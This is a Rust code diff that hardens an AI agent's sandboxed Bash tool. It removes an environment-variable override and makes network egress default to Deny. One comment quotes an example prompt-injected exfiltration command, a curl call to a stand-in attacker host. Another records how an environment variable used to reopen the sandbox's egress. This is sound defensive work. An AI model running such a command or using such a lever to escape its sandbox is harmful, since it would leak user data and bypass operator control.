@@ -55,10 +55,13 @@ const MAX_TIMEOUT_MS: u64 = 600_000;
 /// networked shell. Every channel path therefore stays on the fail-safe
 /// [`NetworkPolicy::Deny`] lockdown, so a prompt-injected or remote command
 /// (`curl --data-binary @secret https://attacker`) cannot exfiltrate
-/// sandbox-readable data or reach internal/metadata endpoints. On any
-/// non-local session `WAYLAND_BASH_ALLOW_NETWORK=1` is the explicit operator
-/// opt-in (via [`default_bash_network_policy`]); when no WorkspacePolicy is
-/// attached at all, the conservative default is Deny.
+/// sandbox-readable data or reach internal/metadata endpoints. On a
+/// non-local, non-channel session (an untrusted repository, or a Managed
+/// execution floor) the operator's `[security] egress_allow` is the explicit
+/// opt-in, via
+/// [`workspace_policy::operator_bash_network`](crate::workspace_policy::operator_bash_network);
+/// when no WorkspacePolicy is attached at all, the conservative default is
+/// Deny.
 ///
 /// Note: only sandbox backends that honour [`NetworkPolicy`] (bwrap,
 /// sandbox-exec) actually enforce this. `NoSandboxBackend` ignores the
@@ -199,14 +202,26 @@ pub fn platform_enforces_read_deny() -> bool {
     default_for_platform().enforces_read_deny()
 }
 
-/// Network policy for agent-initiated Bash. Defaults to
-/// [`NetworkPolicy::Deny`]; `WAYLAND_BASH_ALLOW_NETWORK=1` opts back into
-/// full host network (`Inherit`) for network-dependent workflows.
+/// Fail-safe network policy every `WorkspacePolicy` constructor is seeded
+/// with: agent-initiated Bash gets no egress until something with TRUSTED
+/// provenance grants it.
+///
+/// SEC-11 (W2/W3 conformance gate, Linux, reproduced 3/3): this used to read
+/// `WAYLAND_BASH_ALLOW_NETWORK` and return [`NetworkPolicy::Inherit`] when it
+/// was `1`/`true`, so a bare environment variable re-opened the sandboxed
+/// shell's egress — a driver-owned listener recorded `accept_count=1`. The
+/// environment is UNTRUSTED provenance: it is inherited from whatever launched
+/// the process (a CI job, a parent agent, a `direnv` file that travels with a
+/// cloned repository). Raising a boundary from there is the same supply-chain
+/// hazard `SecurityConfig::enabled` is already documented against — *"Disabling
+/// is config-file only (never a bare env var — supply-chain hazard, C8)"* — so
+/// the lever is gone rather than tightened.
+///
+/// The replacement, with the polarity the right way round, is the operator's
+/// config-file allowlist: see
+/// [`workspace_policy::operator_bash_network`](crate::workspace_policy::operator_bash_network).
 pub(crate) fn default_bash_network_policy() -> NetworkPolicy {
-    match std::env::var("WAYLAND_BASH_ALLOW_NETWORK") {
-        Ok(v) if v == "1" || v.eq_ignore_ascii_case("true") => NetworkPolicy::Inherit,
-        _ => NetworkPolicy::Deny,
-    }
+    NetworkPolicy::Deny
 }
 
 /// Render a `SandboxOutput` into the `ToolResult` shape BashTool has always
